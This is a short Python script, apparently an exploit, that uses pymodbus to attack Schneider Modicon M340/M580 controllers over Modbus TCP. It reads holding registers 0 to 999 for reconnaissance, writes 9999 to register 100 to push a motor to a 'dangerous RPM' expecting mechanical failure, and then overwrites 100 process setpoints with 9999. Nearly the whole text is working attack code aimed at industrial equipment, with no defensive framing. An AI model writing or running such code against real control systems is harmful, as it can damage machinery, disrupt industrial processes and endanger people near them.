from pymodbus.client import ModbusTcpClient

def modicon_exploitation(target_ip, unit_id=1):
    """
    Exploit Modicon M340/M580 via Modbus
    """
    client = ModbusTcpClient(target_ip, port=502)
    client.connect()

    # Reconnaissance: Read all holding registers
    print("[*] Mapping register space...")
    register_map = {}

    for addr in range(0, 1000):
        try:
            result = client.read_holding_registers(addr, 1, unit=unit_id)
            if not result.isError():
                register_map[addr] = result.registers[0]
                print(f"Register {addr}: {result.registers[0]}")
        except:
            pass

    # Attack: Identify critical registers
    # Example: Register 100 controls motor speed

    # Malicious write: Set motor to dangerous RPM
    client.write_register(100, 9999, unit=unit_id)
    print("[+] Motor speed set to maximum (potential mechanical failure)")

    # Write multiple registers (FC 16)
    # Attack: Overwrite entire process setpoint table
    malicious_values = [9999] * 100
    client.write_registers(0, malicious_values, unit=unit_id)
    print("[+] Process setpoints overwritten")

    client.close()

# modicon_exploitation('192.168.1.100')
